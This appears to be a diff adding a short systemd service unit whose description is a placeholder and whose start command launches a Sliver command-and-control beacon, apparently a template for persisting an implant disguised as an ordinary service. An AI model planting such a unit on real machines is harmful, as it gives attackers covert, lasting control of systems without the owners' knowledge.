@@ -1,0 +1,9 @@
+[Unit]
+Description=<some_service_here>
+
+[Service]
+Type=Simple
+ExecStart=<sliver_beacon> &; exit 1
+
+[Install]
+WantedBy=default.target
